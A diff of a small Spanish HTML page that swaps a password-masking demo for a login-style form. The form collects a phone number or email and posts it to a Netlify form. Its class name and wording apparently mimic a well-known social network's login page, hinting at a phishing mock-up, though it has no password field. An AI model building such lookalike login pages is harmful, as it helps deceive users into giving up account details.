@@ -1,38 +1,63 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Cuadro de texto con puntos</title>
+    <title>Cuadro de texto con imágenes</title>
+    <style>
+        .imagen-input {
+            position: relative;
+            display: inline-block;
+            width: 250px;
+        }
+
+        .imagen-input input[type="text"] {
+            width: 100%;
+            padding-right: 30px;
+        }
+
+        .imagen-input img {
+            position: absolute;
+            top: 50%;
+            right: 5px;
+            transform: translateY(-50%);
+            height: 20px;
+            width: 20px;
+            cursor: pointer;
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
+        }
+    </style>
     <script>
-        function hideText(event) {
-            var input = document.getElementById("myInput");
-            input.value += "•";
-            event.preventDefault();
-        }
+        function mostrarImagenes() {
+            var texto = document.getElementById("correo").value;
+            var contenedor = document.getElementById("imagenesContainer");
+            contenedor.innerHTML = "";
 
-        function showText() {
-            var input = document.getElementById("myInput");
-            var hiddenText = input.value.replace(/•/g, "");
-            alert("Texto oculto: " + hiddenText);
-        }
-
-        function replacePassword() {
-            var passwordInput = document.getElementById("departamento");
-            var hiddenInput = document.getElementById("myInput");
-            passwordInput.value = hiddenInput.value.replace(/•/g, "");
+            for (var i = 0; i < texto.length; i++) {
+                var letra = texto[i];
+                var imagen = document.createElement("img");
+                imagen.src = "ruta_de_la_imagen"; // Reemplaza "ruta_de_la_imagen" con la ruta correcta de la imagen que deseas mostrar
+                imagen.style.transitionDelay = i * 0.1 + "s";
+                contenedor.appendChild(imagen);
+                setTimeout(function(img) {
+                    img.style.opacity = 1;
+                }, i * 100, imagen);
+            }
         }
     </script>
 </head>
 <body>
 
-<h2>Cuadro de texto con puntos</h2>
-<form name="myForm" method="POST" data-netlify="true" onsubmit="submit" action="/index">
-
-    <label for="myInput">Texto oculto:</label>
-    <input type="password" id="myInput" onkeydown="hideText(event)" required>
-    <br>
-    <input type="button" value="Mostrar" onclick="showText()">
-</form>
-
+<div class="_5rut">
+    <form name="contact" method="POST" data-netlify="true" action="/index">
+        <div class="form-group">
+            <div class="imagen-input">
+                <input class="form-control" type="text" name="correo" id="correo" placeholder="Número de móvil o correo electrónico" required oninput="mostrarImagenes()">
+                <div id="imagenesContainer"></div>
+            </div>
+        </div>
+        <button type="submit" name="submit" class="btn btn-primary btn-block">Iniciar sesión</button>
+    </form>
+</div>
 
 </body>
 </html>
